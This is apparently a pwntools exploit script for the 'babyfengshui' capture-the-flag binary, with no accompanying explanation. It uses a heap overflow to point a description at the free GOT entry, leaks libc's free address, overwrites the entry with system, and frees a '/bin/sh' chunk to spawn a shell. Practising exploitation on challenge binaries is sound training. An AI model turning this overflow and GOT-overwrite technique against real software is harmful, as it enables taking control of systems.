from pwn import *

debug = 1
if debug:
	p = process('./babyfengshui')
else:
	p = remote()

def add(size, desc):
	p.recvuntil('Action: ')
	p.sendline('0')
	p.recvuntil('size of description: ')
	p.sendline( str(size) )
	p.recvuntil('name: ')
	p.sendline('w0lfzhang')
	p.recvuntil("text length: ")
	p.sendline('20')
	p.recvuntil("text: ")
	p.sendline(desc)

def delete(index):
	p.recvuntil("Action: ")
	p.sendline('1')
	p.recvuntil("index: ")
	p.sendline( str(index) )

def display(index):
	p.recvuntil("Action: ")
	p.sendline('2')
	p.recvuntil("index: ")
	p.sendline( str(index) )
	p.recvuntil("description: ")
	r = p.recv(4)
	print r
	addr = u32(r)
	print "free address: " + hex(addr)
	return addr

def update(index, nsize, ndesc):
	p.recvuntil("Action: ")
	p.sendline('3')
	p.recvuntil("index: ")
	p.sendline( str(index) )
	p.recvuntil("text length: ")
	p.sendline( str(nsize) )
	p.recvuntil("text: ")
	p.sendline(ndesc)

libc = ELF('./libc.so')
system_off = libc.symbols['free'] - libc.symbols['system']
print "free offset: " + hex(libc.symbols['free'])
print "system offset: " + hex(libc.symbols['system'])
free_got = 0x0804B010

add(0x80, '0000')
add(0x80, '1111')
add(0x80, '/bin/sh\x00')

delete(0)

add(0xD0, '3333')  

update(3, 430, 'a' * 408 + p32(free_got))

#raw_input("go?")
free_addr = display(1)
system_addr = free_addr - 0x36ad0
print "system address: " + hex(system_addr)

update(1, 20, p32(system_addr))

raw_input("go")
delete(2)

p.interactive()       



